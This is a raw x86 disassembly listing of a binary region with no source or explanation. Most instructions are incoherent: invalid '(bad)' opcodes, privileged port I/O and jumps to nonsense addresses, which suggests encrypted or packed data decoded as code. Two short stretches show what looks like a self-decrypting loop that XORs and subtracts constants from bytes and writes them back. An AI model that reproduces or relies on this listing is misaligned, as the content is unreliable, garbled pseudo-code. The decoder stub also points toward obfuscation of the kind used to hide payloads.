  4038a2:	sub    DWORD PTR ds:0x9c6e9219,ecx
  4038a8:	and    ebp,esi
  4038aa:	dec    ebp
  4038ab:	mov    es,WORD PTR [edx+0x29]
  4038ae:	jle    0x40385a
  4038b0:	gs in  eax,dx
  4038b2:	cmp    eax,DWORD PTR [esi-0x5f]
  4038b5:	dec    ecx
  4038b6:	dec    edi
  4038b7:	pushf  
  4038b8:	hlt    
  4038b9:	add    ah,BYTE PTR [ecx+0x8]
  4038bc:	repnz out 0x90,al
  4038bf:	test   DWORD PTR [ebp+0x44d78065],edi
  4038c5:	push   cs
  4038c6:	stos   BYTE PTR es:[edi],al
  4038c7:	and    BYTE PTR [ecx+0x38f2e5c5],al
  4038cd:	in     eax,dx
  4038ce:	out    0x47,eax
  4038d0:	scas   eax,DWORD PTR es:[edi]
  4038d1:	std    
  4038d2:	mov    bh,bh
  4038d4:	cmp    edi,DWORD PTR [ebp+0x5]
  4038d7:	sahf   
  4038d8:	shl    BYTE PTR [eax],cl
  4038da:	pop    ss
  4038db:	add    eax,DWORD PTR [ecx+0xced86b3]
  4038e1:	fisttp QWORD PTR [ebx]
  4038e3:	shl    ah,1
  4038e5:	fcom   QWORD PTR [ecx+0x4c]
  4038e8:	cmp    eax,0x4f22a27f
  4038ed:	mov    ecx,0x2b6872b8
  4038f2:	in     al,dx
  4038f3:	fst    QWORD PTR [ecx-0x4e0e34fb]
  4038f9:	mov    al,ds:0x6f493aa4
  4038fe:	arpl   di,si
  403900:	int3   
  403901:	inc    BYTE PTR [ebx+0x77]
  403904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403905:	fisubr DWORD PTR [ecx]
  403907:	cmp    DWORD PTR [esi+edx*4-0x6173c18d],edi
  40390e:	xor    eax,0xb1e6fefa
  403913:	pusha  
  403914:	mov    DWORD PTR [edi-0x7b34e9d1],eax
  40391a:	add    al,0xe8
  40391c:	jnp    0x4038a3
  40391e:	or     BYTE PTR [ecx],dl
  403920:	cwde   
  403921:	cmp    edi,ebp
  403923:	enter  0xef9f,0x41
  403927:	and    BYTE PTR [ebx-0x480f5e0b],cl
  40392d:	aad    0xd6
  40392f:	jbe    0x403903
  403931:	add    al,0xcf
  403933:	ret    0x4c1
  403936:	add    ebx,DWORD PTR [esi+eax*8]
  403939:	aaa    
  40393a:	not    esi
  40393c:	mov    ah,0x24
  40393e:	and    DWORD PTR [ebx],ebx
  403940:	repz jne 0x4038c8
  403943:	add    edx,DWORD PTR [esi]
  403945:	mov    cs,WORD PTR [edi]
  403947:	pushf  
  403948:	jns    0x403991
  40394a:	addr16 mov dl,0xea
  40394d:	push   ebx
  40394e:	sti    
  40394f:	pop    ss
  403950:	push   ds
  403951:	(bad)  
  403952:	les    esp,FWORD PTR [ebx+0x2f7ceb34]
  403958:	ja     0x403961
  40395a:	shl    DWORD PTR [edx],cl
  40395c:	xchg   DWORD PTR [eax+0x39],edi
  40395f:	loope  0x4039cd
  403961:	or     esi,DWORD PTR [ecx-0x4f]
  403964:	push   edi
  403965:	icebp  
  403966:	inc    esp
  403967:	enter  0xc77c,0x2
  40396b:	lock fwait
  40396d:	in     eax,0x84
  40396f:	jae    0x40399e
  403971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403972:	test   eax,0x8ed698e7
  403977:	mov    dl,0xa3
  403979:	pop    ecx
  40397a:	rcr    DWORD PTR [ebp-0x63],0x7c
  40397e:	pop    ebx
  40397f:	sbb    cl,dl
  403981:	aad    0x85
  403983:	xchg   ebx,eax
  403984:	and    eax,0x3d3bf519
  403989:	mov    esi,0x7842030e
  40398e:	mov    eax,ds:0x2e0a888c
  403993:	jb     0x40391a
  403995:	ror    BYTE PTR [edi],0x84
  403998:	ss add al,0x0
  40399b:	add    BYTE PTR [ebp-0x977b],cl
  4039a1:	call   DWORD PTR [eax-0x75]
  4039a4:	inc    ebp
  4039a5:	in     al,0x33
  4039a7:	mov    BYTE PTR [ebx],0xc7
  4039aa:	push   eax
  4039ab:	mov    eax,DWORD PTR [ebp-0x18]
  4039ae:	add    eax,0xee
  4039b3:	push   eax
  4039b4:	mov    eax,DWORD PTR [ebp-0x18]
  4039b7:	mov    eax,DWORD PTR [eax+0x198]
  4039bd:	push   DWORD PTR [eax]
  4039bf:	jmp    0x403dcd
  4039c4:	push   es
  4039c5:	js     0x403a2e
  4039c7:	repnz popa 
  4039c9:	jno    0x40395e
  4039cb:	call   0xb3ee171
  4039d0:	sbb    BYTE PTR [esi+0x1df7bf29],dh
  4039d6:	jle    0x403a56
  4039d8:	outs   dx,DWORD PTR ds:[esi]
  4039d9:	jge    0x403a59
  4039db:	jle    0x403a29
  4039dd:	push   ds
  4039de:	jae    0x4039d4
  4039e0:	adc    edi,DWORD PTR [eax-0x34]
  4039e3:	and    al,0x9
  4039e5:	ins    DWORD PTR es:[edi],dx
  4039e6:	cmp    ebx,DWORD PTR [ecx-0x11]
  4039e9:	retf   0x4df6
  4039ec:	and    al,0x4
  4039ee:	in     eax,dx
  4039ef:	(bad)
  4039f3:	xchg   esi,eax
  4039f4:	popf   
  4039f5:	call   0x2835:0x913b8bb6
  4039fc:	iret   
  4039fd:	fs dec esi
  4039ff:	ds (bad) 
  403a01:	jmp    0x403a17
  403a03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a04:	and    ch,BYTE PTR [ecx]
  403a06:	fadd   QWORD PTR [ebp+0x35]
  403a09:	push   esp
  403a0a:	in     al,0xb5
  403a0c:	outs   dx,DWORD PTR ds:[esi]
  403a0d:	cdq    
  403a0e:	stos   DWORD PTR es:[edi],eax
  403a0f:	pop    DWORD PTR [edx-0x5ec8074d]
  403a15:	sub    BYTE PTR [edi-0x3aae916e],ah
  403a1b:	pop    ecx
  403a1c:	push   edi
  403a1d:	sti    
  403a1e:	add    dh,cl
  403a20:	push   esi
  403a21:	(bad)  
  403a22:	add    dh,dl
  403a24:	montmul (bad)
  403a25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a26:	add    eax,0xcb17f086
  403a2b:	and    dl,BYTE PTR [edx-0x37]
  403a2e:	dec    edx
  403a2f:	inc    edi
  403a30:	inc    eax
  403a31:	xchg   ecx,eax
  403a32:	mov    ds:0xee21d772,eax
  403a37:	pop    ebx
  403a38:	(bad)  
  403a39:	jnp    0x403a0e
  403a3b:	mov    ?,WORD PTR [edx+esi*4]
  403a3e:	inc    esp
  403a3f:	inc    BYTE PTR [ecx]
  403a41:	mov    WORD PTR [edx],?
  403a43:	data16 jecxz 0x4039e3
  403a46:	addr16 xchg ebp,eax
  403a48:	pop    edx
  403a49:	ret    0x604a
  403a4c:	push   ds
  403a4d:	mov    ebx,0xab85da0f
  403a52:	mov    bh,0xa4
  403a54:	fadd   st(7),st
  403a56:	stos   BYTE PTR es:[edi],al
  403a57:	inc    edx
  403a58:	cwde   
  403a59:	sub    al,0x77
  403a5b:	mov    eax,ds:0xa60c6936
  403a60:	gs aas 
  403a62:	mov    bh,0x60
  403a64:	xor    ah,0xba
  403a67:	imul   eax,DWORD PTR [edx-0x4265ba55],0x86fcbd9
  403a71:	fld1   
  403a73:	aam    0xf2
  403a75:	and    DWORD PTR [esi-0x524c85ad],edx
  403a7b:	sahf   
  403a7c:	sbb    DWORD PTR [ecx],0xffffffee
  403a7f:	and    eax,0x1437b48b
  403a84:	fwait
  403a85:	and    al,BYTE PTR [ecx]
  403a87:	sbb    edi,esp
  403a89:	push   edi
  403a8a:	push   0xb2b54bd9
  403a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a90:	scas   eax,DWORD PTR es:[edi]
  403a91:	ss dec edi
  403a93:	jp     0x403adc
  403a95:	push   edi
  403a96:	xchg   ebx,eax
  403a97:	sar    BYTE PTR [ebp+0x62],1
  403a9a:	ret    0x7370
  403a9d:	(bad)  
  403a9e:	jmp    0xef59:0xa2c7fc82
  403aa5:	jne    0x403a8d
  403aa7:	add    DWORD PTR [eax-0x3967f537],ebx
  403aad:	lea    ebx,ds:0xce080568
  403ab3:	es pop ds
  403ab5:	inc    eax
  403ab6:	ins    BYTE PTR es:[edi],dx
  403ab7:	es xchg esi,eax
  403ab9:	cmp    al,0x52
  403abb:	push   esi
  403abc:	mov    edx,0xb9f58fca
  403ac1:	imul   ecx,DWORD PTR [ebp+eax*1-0x9],0xffdd4804
  403ac9:	aad    0xe5
  403acb:	test   al,0xf4
  403acd:	or     al,0xd0
  403acf:	add    al,0x1d
  403ad1:	mov    edi,0x18274547
  403ad6:	cdq    
  403ad7:	inc    esi
  403ad8:	sub    BYTE PTR [ebx+0x3a],al
  403adb:	sbb    al,0x43
  403add:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  403adf:	mov    edx,0x39833e84
  403ae4:	jae    0x403ac3
  403ae6:	mov    ah,0x1
  403ae8:	loope  0x403ad3
  403aea:	push   ebx
  403aeb:	xor    edx,DWORD PTR [ebx+0x7]
  403aee:	push   eax
  403aef:	sbb    dh,BYTE PTR [edi]
  403af1:	popf   
  403af2:	test   DWORD PTR [eax-0x6f9f51ad],edx
  403af8:	xor    ebx,DWORD PTR [esi+0x2ba9ea0f]
  403afe:	pop    ebp
  403aff:	adc    dh,BYTE PTR [ebx+esi*8-0x2]
  403b03:	in     al,0x3e
  403b05:	outs   dx,BYTE PTR ds:[esi]
  403b06:	jae    0x403b5d
  403b08:	int    0x55
  403b0a:	adc    esi,ebp
  403b0c:	jb     0x403b59
  403b0e:	sbb    eax,0xe800c3a8
  403b13:	scas   al,BYTE PTR es:[edi]
  403b14:	pop    ebp
  403b15:	mov    ds:0x85fda4fb,eax
  403b1a:	fstp   QWORD PTR fs:[ebx-0x63503649]
  403b21:	inc    eax
  403b22:	bound  esp,QWORD PTR [esi+0x75771df0]
  403b28:	js     0x403af3
  403b2a:	loopne 0x403b58
  403b2c:	outs   dx,DWORD PTR ds:[esi]
  403b2d:	scas   al,BYTE PTR es:[edi]
  403b2e:	jl     0x403b77
  403b30:	inc    ebp
  403b31:	test   al,0x51
  403b33:	cdq    
  403b34:	or     al,0x24
  403b36:	push   0xffffff9d
  403b38:	inc    eax
  403b39:	or     al,0xaf
  403b3b:	adc    bl,BYTE PTR [ebx+0x67]
  403b3e:	mov    bh,0x56
  403b40:	mov    eax,0x2485ac8e
  403b45:	xchg   DWORD PTR [ecx+eiz*8+0x1004bae6],ebp
  403b4c:	xchg   edi,eax
  403b4d:	mov    cs,WORD PTR [eax+edi*2-0x65]
  403b51:	aaa    
  403b52:	xlat   BYTE PTR ds:[ebx]
  403b53:	inc    ebx
  403b54:	icebp  
  403b55:	lods   al,BYTE PTR ds:[esi]
  403b56:	lods   al,BYTE PTR ds:[esi]
  403b57:	and    ecx,DWORD PTR [ebx]
  403b59:	test   eax,0xdfd5e6d4
  403b5e:	les    edi,FWORD PTR [edi+0x3252b1b1]
  403b64:	inc    esp
  403b65:	ja     0x403b55
  403b67:	test   BYTE PTR [eax+eax*4+0x7be7e1a9],0xd8
  403b6f:	adc    eax,0x6aa03e03
  403b74:	stos   DWORD PTR es:[edi],eax
  403b75:	push   ss
  403b76:	xor    al,0x58
  403b78:	xchg   edx,eax
  403b79:	in     eax,0xd5
  403b7b:	xchg   bh,bl
  403b7d:	jnp    0x403bf3
  403b7f:	(bad)  
  403b80:	mov    eax,ds:0x92b81bd9
  403b85:	pop    esi
  403b86:	loopne 0x403b09
  403b88:	xchg   DWORD PTR ds:0xd357c1bf,edx
  403b8e:	test   eax,0xe76ce406
  403b93:	xchg   ebp,eax
  403b94:	ud0    edi,ecx
  403b97:	ss cwde 
  403b99:	push   0x59878128
  403b9e:	mov    WORD PTR [eax],es
  403ba0:	xchg   DWORD PTR [ebx-0x5586c665],edi
  403ba6:	lods   eax,DWORD PTR ds:[esi]
  403ba7:	addr16 dec esi
  403ba9:	mul    DWORD PTR [esi-0x682813a8]
  403baf:	push   edx
  403bb0:	call   0xb00d490a
  403bb5:	fisub  DWORD PTR [eax-0xc]
  403bb8:	pop    ebp
  403bb9:	xchg   ecx,eax
  403bba:	jnp    0x403bce
  403bbc:	dec    edi
  403bbd:	cmp    al,0xb
  403bbf:	inc    eax
  403bc0:	lds    ebx,FWORD PTR [ebx+edi*2-0x7b44fff2]
  403bc7:	sti    
  403bc8:	dec    ecx
  403bc9:	add    esi,DWORD PTR [eax+esi*8+0x49]
  403bcd:	dec    eax
  403bce:	add    al,0x5d
  403bd0:	xchg   edx,eax
  403bd1:	cmp    eax,0x92a4bc69
  403bd6:	dec    edx
  403bd7:	mov    esp,0x3893b24d
  403bdc:	xchg   cl,cl
  403bde:	adc    eax,0x8a01ef28
  403be3:	ins    BYTE PTR es:[edi],dx
  403be4:	and    cl,BYTE PTR [esi-0x147284c]
  403bea:	dec    eax
  403beb:	pop    esp
  403bec:	bndstx [esi+0x51b2c107],(bad)
  403bf3:	mov    edi,0x86c4a92c
  403bf8:	xlat   BYTE PTR ds:[ebx]
  403bf9:	or     al,0xf
  403bfb:	call   0x8bdcfc43
  403c00:	sti    
  403c01:	pop    edx
  403c02:	and    al,0xdb
  403c04:	ins    DWORD PTR es:[edi],dx
  403c05:	imul   edi,DWORD PTR [edx-0x5d715e7f],0xfa651c28
  403c0f:	fld    DWORD PTR [edx]
  403c11:	mov    edx,0xfc063499
  403c16:	stos   BYTE PTR es:[edi],al
  403c17:	shr    BYTE PTR [edx+edi*8+0x7e],0xe5
  403c1c:	imul   ecx,DWORD PTR [ebp+0x6],0x3d72fb2c
  403c23:	js     0x403bab
  403c25:	or     al,cl
  403c27:	jle    0x403c6a
  403c29:	push   edx
  403c2a:	lods   eax,DWORD PTR ds:[esi]
  403c2b:	in     al,0xa3
  403c2d:	add    al,cl
  403c2f:	adc    al,0x39
  403c31:	mov    ebx,0xc11b4a5d
  403c36:	cdq    
  403c37:	loop   0x403c16
  403c39:	add    cl,BYTE PTR [edx+0x22db5b0d]
  403c3f:	jne    0x403c69
  403c41:	in     eax,0xdd
  403c43:	inc    edi
  403c44:	pop    edi
  403c45:	in     eax,dx
  403c46:	mov    esp,0x36055ab8
  403c4b:	dec    ecx
  403c4c:	cmp    eax,0x97257653
  403c51:	(bad)  
  403c52:	arpl   WORD PTR [bx+di-0x8c4],si
  403c57:	fdiv   st,st(2)
  403c59:	imul   ebx,DWORD PTR [ebx],0x8b610dc8
  403c5f:	add    al,0x90
  403c61:	adc    al,0xc2
  403c63:	adc    ch,dh
  403c65:	and    BYTE PTR [eax+ebp*1+0x59f90e81],0x66
  403c6d:	dec    edi
  403c6e:	imul   dl
  403c70:	cmp    DWORD PTR [ecx],edx
  403c72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c73:	fistp  WORD PTR [edi]
  403c75:	jg     0x403c90
  403c77:	cmp    BYTE PTR [ebx+0x67],bh
  403c7a:	ficom  DWORD PTR [ecx+eax*1-0x72]
  403c7e:	cmp    al,0xf4
  403c80:	iret   
  403c81:	and    ch,BYTE PTR [edx+ecx*1-0x2692f1ae]
  403c88:	adc    edx,ecx
  403c8a:	in     al,dx
  403c8b:	xlat   BYTE PTR ds:[bx]
  403c8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c8e:	fs into 
  403c90:	js     0x403cdd
  403c92:	ffreep st(7)
  403c94:	xchg   ecx,eax
  403c95:	xchg   ecx,eax
  403c96:	or     al,0xad
  403c98:	xlat   BYTE PTR ds:[ebx]
  403c99:	adc    dh,BYTE PTR [ebx+0x32b32800]
  403c9f:	repz in al,0x5e
  403ca2:	cmp    edi,DWORD PTR [edx+0x68]
  403ca5:	mov    eax,ds:0x62ec78d5
  403caa:	je     0x403c59
  403cac:	jmp    0x3e8a608a
  403cb1:	jmp    0xf103:0x9ca6b3a
  403cb8:	mov    ds:0xb423e025,eax
  403cbd:	and    al,0xf8
  403cbf:	cmp    eax,0x83611626
  403cc4:	cmp    edi,DWORD PTR [edx]
  403cc6:	ja     0x403c8e
  403cc8:	repz dec eax
  403cca:	inc    edi
  403ccb:	or     DWORD PTR [edi+0x63],esp
  403cce:	inc    edi
  403ccf:	outs   dx,BYTE PTR ds:[esi]
  403cd0:	add    BYTE PTR [esi+0x54],dl
  403cd3:	lahf   
  403cd4:	aad    0xd3
  403cd6:	call   0x7d48:0x564c610d
  403cdd:	ret    0xedc4
  403ce0:	hlt    
  403ce1:	ds mov esi,0x3f67d6f6
  403ce7:	mov    al,0xfc
  403ce9:	push   edi
  403cea:	adc    al,0xa5
  403cec:	sbb    DWORD PTR [ebp+0x5f],eax
  403cef:	push   ecx
  403cf0:	in     al,dx
  403cf1:	mov    ah,0xb8
  403cf3:	sub    al,0xff
  403cf5:	pop    esp
  403cf6:	adc    DWORD PTR [edx+0x38559519],edi
  403cfc:	jmp    0x92bcdd38
  403d01:	sbb    eax,0x5108a977
  403d06:	ds jmp 0xd304:0xa651d0
  403d0e:	jg     0x403cf3
  403d10:	sub    BYTE PTR [ecx+0x36],ch
  403d13:	mov    ds:0x81817412,al
  403d18:	xchg   ebp,eax
  403d19:	jge    0x403d54
  403d1b:	ret    
  403d1c:	hlt    
  403d1d:	pop    ss
  403d1e:	outs   dx,BYTE PTR ds:[esi]
  403d1f:	dec    edi
  403d20:	out    dx,al
  403d21:	shl    edx,cl
  403d23:	mov    dh,0x75
  403d25:	jge    0x403d10
  403d27:	dec    eax
  403d28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d29:	mov    bh,0xd3
  403d2b:	add    al,0xdd
  403d2d:	int    0x66
  403d2f:	dec    ebp
  403d30:	fist   WORD PTR [edi]
  403d32:	(bad)  
  403d33:	xor    al,0x12
  403d35:	push   es
  403d36:	sub    DWORD PTR [esi+0x21db768e],ecx
  403d3c:	stos   DWORD PTR es:[edi],eax
  403d3d:	fstp   DWORD PTR [eax]
  403d3f:	cwde   
  403d40:	pop    edx
  403d41:	mov    ebx,0xf3888220
  403d46:	lock or eax,0xcbd4e7e9
  403d4c:	mov    al,0xa8
  403d4e:	cs jmp 0x403d85
  403d51:	paddq  mm1,QWORD PTR [edx-0x6493c3ff]
  403d58:	sub    DWORD PTR [esi+0x6e55207f],eax
  403d5e:	arpl   WORD PTR [edi+0x77c02225],ax
  403d64:	es jmp 0x403d8a
  403d67:	inc    esi
  403d68:	gs in  eax,0x58
  403d6b:	xor    al,0xf7
  403d6d:	mov    dl,0x67
  403d6f:	xor    BYTE PTR [eax+0x38758189],dl
  403d75:	pop    esp
  403d76:	fidivr DWORD PTR [eax+0x1c8c7c18]
  403d7c:	stos   BYTE PTR es:[edi],al
  403d7d:	xchg   ecx,eax
  403d7e:	adc    DWORD PTR [edx+0x60],esi
  403d81:	mov    esi,0xbc55f0b3
  403d86:	or     BYTE PTR [ecx+0x40b5c191],0xf9
  403d8d:	or     al,BYTE PTR [eax-0x6b5e48b4]
  403d93:	scas   eax,DWORD PTR es:[edi]
  403d94:	pop    es
  403d95:	or     BYTE PTR [eax+0x66a21c55],0xc8
  403d9c:	jmp    FWORD PTR [ebx+0x221d46a6]
  403da2:	in     al,0x83
  403da4:	loope  0x403da0
  403da6:	in     al,0x71
  403da8:	xchg   ecx,eax
  403da9:	les    esi,FWORD PTR [esi-0x5b]
  403dac:	mov    BYTE PTR [edx-0x3def297d],dh
  403db2:	das    
  403db3:	ret    0xf558
  403db6:	push   eax
  403db7:	(bad)  
  403db8:	dec    eax
  403db9:	cmp    al,0x83
  403dbb:	jle    0x403e0f
  403dbd:	adc    eax,0xda42159a
  403dc2:	mov    al,ds:0x4f512231
  403dc7:	fwait
  403dc8:	pop    ebp
  403dc9:	mov    ds,WORD PTR [eax-0x15]
  403dcc:	mov    al,ch
  403dce:	mov    DWORD PTR [edx+0x4d8b0000],0xb8ce33d8
  403dd8:	gs (bad) 
  403dda:	int    0xff
  403ddc:	sub    eax,ecx
  403dde:	sub    eax,DWORD PTR [ebp-0x4]
  403de1:	mov    ecx,DWORD PTR [ebp-0x48]
  403de4:	add    ecx,eax
  403de6:	mov    eax,DWORD PTR [ebp-0x4]
  403de9:	mov    DWORD PTR [eax+0x1],ecx
  403dec:	mov    al,BYTE PTR [ebp-0x11]
  403def:	mov    ecx,DWORD PTR [ebp-0x4]
  403df2:	xor    al,0x46
  403df4:	sub    al,0x38
  403df6:	mov    BYTE PTR [ecx],al
  403df8:	lea    eax,[ebp-0x4]
  403dfb:	inc    BYTE PTR [eax]
  403dfd:	inc    eax
  403dfe:	push   eax
  403dff:	pop    ecx
  403e00:	dec    ecx
  403e01:	jmp    0x40420f
  403e06:	dec    esp
  403e07:	repz repz adc esi,DWORD PTR [ecx+0x13]
  403e0c:	ins    BYTE PTR es:[edi],dx
  403e0d:	jno    0x403e09
  403e0f:	in     eax,0x73
  403e11:	sbb    esp,esi
  403e13:	jmp    0x1a246f0b
  403e18:	jle    0x403e98
  403e1a:	outs   dx,DWORD PTR ds:[esi]
  403e1b:	jge    0x403e9b
  403e1d:	jle    0x403e9b
  403e1f:	mov    bh,BYTE PTR fs:[esi-0x33c6c6e8]
  403e26:	adc    eax,0x6ac55d55
  403e2b:	cmp    dh,BYTE PTR [ecx]
  403e2d:	sbb    eax,0xa786d537
  403e32:	xchg   esi,eax
  403e33:	outs   dx,DWORD PTR ds:[esi]
  403e34:	pop    edi
  403e35:	push   edi
  403e36:	mov    esi,0xec0cc2fe
  403e3b:	mov    dh,0xab
  403e3d:	imul   edx,DWORD PTR [esi],0xc0bc6bc2
  403e43:	sub    dl,cl
  403e45:	in     al,dx
  403e46:	sub    eax,esi
  403e48:	lahf   
  403e49:	in     eax,dx
  403e4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e4b:	stos   DWORD PTR es:[edi],eax
  403e4c:	sub    dh,ch
  403e4e:	or     esi,eax
  403e50:	mov    dh,0x0
  403e52:	hlt    
  403e53:	and    esp,edx
  403e55:	outs   dx,BYTE PTR ds:[esi]
  403e56:	popa   
  403e57:	pusha  
  403e58:	std    
  403e59:	or     eax,0xe6d03554
  403e5e:	push   eax
  403e5f:	pop    ds
  403e60:	adc    DWORD PTR [ebp+esi*4-0x64178704],ebx
  403e67:	pop    ds
  403e68:	push   cs
  403e69:	shr    BYTE PTR [esi],cl
  403e6b:	icebp  
  403e6c:	out    dx,eax
  403e6d:	cli    
  403e6e:	aad    0xa
  403e70:	loope  0x403dfd
  403e72:	test   BYTE PTR [ecx+edx*8+0xb],al
  403e76:	xchg   edx,eax
  403e77:	or     bl,BYTE PTR [eax]
  403e79:	retf   0xff77
  403e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e7d:	enter  0x4583,0x82
  403e81:	ret    
  403e82:	fwait
  403e83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e84:	in     al,0xf0
  403e86:	sbb    ebp,esp
  403e88:	jmp    0x403eba
  403e8a:	push   0xea643775
  403e8f:	lock imul ebx,ecx,0xffffffb7
  403e93:	cdq    
  403e94:	(bad)  
  403e95:	and    eax,0x26262cb3
  403e9a:	cmp    eax,ecx
  403e9c:	xchg   edx,eax
  403e9d:	ret    
  403e9e:	mov    esi,0x588eae73
  403ea3:	ret    0xb9b
  403ea6:	retf   
  403ea7:	inc    BYTE PTR [edi]
  403ea9:	lock arpl dx,si
  403eac:	adc    BYTE PTR [ecx+0x71ed6bc8],0xbf
  403eb3:	jecxz  0x403e9e
  403eb5:	(bad)  
  403eb6:	mov    edi,0xd2655c5b
  403ebb:	enter  0xc7a3,0x35
  403ebf:	mov    ch,0xc
  403ec2:	dec    edi
  403ec3:	dec    ecx
  403ec4:	je     0x403e49
  403ec6:	dec    ecx
  403ec7:	ret    
  403ec8:	bound  ebx,QWORD PTR [ecx-0x3a]
  403ecb:	push   0xffffffe8
  403ecd:	in     eax,0x12
  403ecf:	test   ebx,edi
  403ed1:	mov    al,0xd2
  403ed3:	shl    esp,1
  403ed5:	repnz mov eax,DWORD PTR ds:0x4c906a9a
  403edc:	je     0x403eab
  403ede:	mov    DWORD PTR [ecx-0x66],edi
  403ee1:	mov    ebp,0x1615de07
  403ee6:	sub    al,0x7f
  403ee8:	cli    
  403ee9:	jbe    0x403f04
  403eeb:	mov    esp,0xd7ebdca4
  403ef0:	mov    ebx,0xd2b2003a
  403ef5:	in     eax,dx
  403ef6:	dec    ebp
  403ef7:	sub    al,0xb9
  403ef9:	cmp    al,0xd5
  403efb:	or     BYTE PTR [ebx-0x6f06101a],bh
  403f01:	mov    al,0xa2
  403f03:	mov    ah,0xa4
  403f05:	imul   eax,DWORD PTR [ebp+0x1ee48947],0x508105c8
  403f0f:	xchg   ebx,eax
  403f10:	add    eax,0x5a06c473
  403f15:	or     al,BYTE PTR [edx-0x5eb73aaa]
  403f1b:	jle    0x403f6b
  403f1d:	inc    edi
  403f1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f1f:	js     0x403f4e
  403f21:	sbb    ebp,DWORD PTR [ecx+0x7c6e80f8]
  403f27:	icebp  
  403f28:	jae    0x403ef4
  403f2a:	adc    al,0xd5
  403f2c:	cmp    al,0x2b
  403f2e:	ins    DWORD PTR es:[edi],dx
  403f2f:	fadd   DWORD PTR [esi-0x1]
  403f32:	mov    bl,0x3d
  403f34:	lea    ecx,[ecx]
  403f36:	imul   ebp,DWORD PTR [esi],0x3f
  403f39:	pop    edx
  403f3a:	cwde   
  403f3b:	mov    ebx,0xd9994016
  403f40:	in     eax,0xde
  403f42:	or     dl,al
  403f44:	hlt    
  403f45:	stos   DWORD PTR es:[edi],eax
  403f46:	mov    ds:0x36f3fde8,eax
  403f4b:	clc    
  403f4c:	adc    ch,BYTE PTR [ecx]
  403f4e:	sbb    BYTE PTR [esi-0x2],dl
  403f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f52:	inc    esi
  403f53:	fdivr  DWORD PTR ds:0x81ebe308
  403f59:	pop    es
  403f5a:	jae    0x403f44
  403f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f5d:	xchg   BYTE PTR [edi+0x55],dl
  403f60:	mov    bh,0x6b
  403f62:	push   esp
  403f63:	inc    ebx
  403f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f65:	jmp    0xdf1f1201
  403f6a:	pop    esp
  403f6b:	js     0x403f35
  403f6d:	jmp    0xac22d71f
  403f72:	dec    ebp
  403f73:	and    al,0xde
  403f75:	in     eax,0x6f
  403f77:	int3   
  403f78:	xor    eax,0xe742f83e
  403f7d:	adc    DWORD PTR [esp+edi*8-0x43f8c820],ebp
  403f84:	fs ret 
  403f86:	sahf   
  403f87:	stc    
  403f88:	and    al,0xe8
  403f8a:	jmp    0xd7444222
  403f8f:	stc    
  403f90:	xchg   esp,eax
  403f91:	dec    edx
  403f92:	(bad)  
  403f93:	in     eax,dx
  403f94:	push   0x5f6894b4
  403f99:	cld    
  403f9a:	aad    0xc2
  403f9c:	push   ebp
  403f9d:	lea    esp,[edx+0x1cb262bb]
  403fa3:	mov    dh,0x9
  403fa5:	ins    DWORD PTR es:[edi],dx
  403fa6:	add    al,0x6f
  403fa8:	inc    edi
  403fa9:	cmc    
  403faa:	into   
  403fab:	test   DWORD PTR [ebx+edx*4+0x5],ecx
  403faf:	mov    edx,0x6db46cf
  403fb4:	cmp    al,0x5
  403fb6:	pop    ebp
  403fb7:	les    ebx,FWORD PTR [ebx+0x45]
  403fba:	enter  0x60f1,0x97
  403fbe:	cwde   
  403fbf:	popa   
  403fc0:	mov    BYTE PTR [edx+ebp*1+0x1e96ebe5],bl
  403fc7:	retf   0xdb2a
  403fca:	xchg   edi,eax
  403fcb:	xor    cl,dl
  403fcd:	sub    esp,DWORD PTR [ecx+eiz*1]
  403fd0:	mov    edi,0x6d3d0267
  403fd5:	inc    ecx
  403fd6:	scas   eax,DWORD PTR es:[edi]
  403fd7:	outs   dx,BYTE PTR ds:[esi]
  403fd8:	mov    ds:0x71d4675d,eax
  403fdd:	nop
  403fde:	xor    eax,0xd35b7ac4
  403fe3:	iret   
  403fe4:	mov    bh,0x7f
  403fe6:	test   BYTE PTR [esi],bl
  403fe8:	mov    edi,0x9f47b8df
  403fed:	aad    0x1a
  403fef:	frstor [eax+edx*8-0x4d]
  403ff3:	fiadd  WORD PTR [ecx+0x1e]
  403ff6:	cmp    BYTE PTR [ebx],ch
  403ff8:	(bad)  
  403ff9:	jo     0x403fcd
  403ffb:	test   eax,0xcffc538
  404000:	xor    al,0x89
  404002:	das    
  404003:	push   0xc32d5d7f
  404008:	cmc    
  404009:	or     dh,ch
  40400b:	xor    eax,esp
  40400d:	cli    
  40400e:	lahf   
  40400f:	out    dx,eax
  404010:	shl    DWORD PTR [ecx+edx*8],0x29
  404014:	inc    edi
  404015:	scas   eax,DWORD PTR es:[edi]
  404016:	cwde   
  404017:	bound  esi,QWORD PTR [edi]
  404019:	ret    0x8371
  40401c:	ins    DWORD PTR es:[edi],dx
  40401d:	xchg   edx,eax
  40401e:	pushf  
  40401f:	retf   
  404020:	xchg   ecx,eax
  404021:	popa   
  404022:	loope  0x404039
  404024:	popa   
  404025:	cmp    bh,BYTE PTR ds:0x960965d4
  40402b:	sub    BYTE PTR [ebx+0x2b88ae68],dh
  404031:	jge    0x404039
  404033:	retf   
  404034:	frstor [edx-0x418a2bf0]
  40403a:	loop   0x403fe9
  40403c:	pushf  
  40403d:	adc    eax,0x4a9829ca
  404042:	add    al,al
  404044:	test   eax,0xd6536792
  404049:	call   0xd342:0xc43d47d8
  404050:	stos   BYTE PTR es:[edi],al
  404051:	les    ecx,FWORD PTR [eax]
  404053:	rcr    edx,0xd6
  404056:	inc    edi
  404057:	pop    esi
  404058:	jp     0x404005
